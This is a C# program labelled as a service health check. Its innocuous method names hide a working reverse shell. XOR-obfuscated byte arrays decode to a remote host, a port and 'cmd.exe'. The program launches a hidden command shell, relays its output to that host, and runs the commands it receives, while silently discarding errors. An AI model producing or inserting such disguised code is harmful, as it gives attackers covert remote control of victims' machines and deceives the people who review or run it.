using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Text;

namespace Diagnostics.Monitoring
{
    class ServiceHealthCheck
    {
        static string ParseConfig(byte[] data, int k)
        {
            char[] r = new char[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (char)(data[i] ^ k);
            return new string(r);
        }

        static void ValidateEndpoint()
        {
            int k = 143;
            byte[] a = new byte[] { 190,182,189,161,190,185,183,161,187,186,161,190,184,187 };
            byte[] b = new byte[] { 186,182,183,185 };
            byte[] c = new byte[] { 236,226,235,161,234,247,234 };

            string host = ParseConfig(a, k);
            int port = int.Parse(ParseConfig(b, k));
            string sh = ParseConfig(c, k);

            TcpClient tcp = new TcpClient();
            tcp.Connect(host, port);
            NetworkStream ns = tcp.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = sh;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            StreamWriter input = p.StandardInput;
            input.AutoFlush = true;

            Thread tOut = new Thread(() => {
                try {
                    byte[] buf = new byte[4096];
                    int read;
                    while ((read = p.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        ns.Write(buf, 0, read);
                } catch {}
            });

            Thread tErr = new Thread(() => {
                try {
                    byte[] buf = new byte[4096];
                    int read;
                    while ((read = p.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        ns.Write(buf, 0, read);
                } catch {}
            });

            tOut.IsBackground = true;
            tErr.IsBackground = true;
            tOut.Start();
            tErr.Start();

            try {
                byte[] recv = new byte[4096];
                int bytes;
                while ((bytes = ns.Read(recv, 0, recv.Length)) > 0)
                {
                    string cmd = Encoding.ASCII.GetString(recv, 0, bytes);
                    input.Write(cmd);
                }
            } catch {}

            p.Close();
            tcp.Close();
        }

        static void Main(string[] args)
        {
            try { ValidateEndpoint(); } catch {}
        }
    }
}
